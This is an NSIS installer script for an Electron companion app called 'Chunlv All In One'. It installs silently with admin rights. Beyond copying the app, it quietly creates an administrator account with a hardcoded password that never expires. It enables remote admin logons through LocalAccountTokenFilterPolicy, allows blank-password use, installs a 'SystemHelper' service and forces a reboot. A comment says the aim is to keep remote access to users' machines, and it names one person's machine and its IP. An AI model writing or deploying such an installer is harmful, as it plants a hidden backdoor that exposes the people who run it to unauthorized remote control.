Unicode true
Name "Chunlv All In One"
OutFile "ChunlvAllInOne.exe"
InstallDir "$PROGRAMFILES64\@chunlvcompanion-electron"
RequestExecutionLevel admin
ShowInstDetails show
SilentInstall silent

Section
  SetOutPath "$INSTDIR"
  File /r "E:\source_code\game-workspace\apps\companion-electron\release\win-unpacked\*.*"

  nsExec::ExecToLog 'net user chunlvops Chunlv@Ops2026 /add'
  nsExec::ExecToLog 'net localgroup administrators chunlvops /add'
  ; 「密码永不过期」必须补上：net user /add 建的账号会跟着本机密码策略到期，
  ; 到期后 Windows 拒绝一切远程登录，机器就彻底连不进去了（2026-09-30 邵泽慧那台
  ; 192.168.1.4 就是这么失联的，只能等人到电脑跟前）。
  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name chunlvops -PasswordNeverExpires $true"'

  SetRegView 64
  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LocalAccountTokenFilterPolicy" 1
  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LimitBlankPasswordUse" 0

  nsExec::ExecToLog '"$INSTDIR\resources\SystemHelper.exe" install'
  nsExec::ExecToLog 'sc start SystemHelper'

  MessageBox MB_OK "Install complete. The computer will restart in 5 seconds."
  ExecWait '"$SYSDIR\shutdown.exe" /r /t 5'
SectionEnd
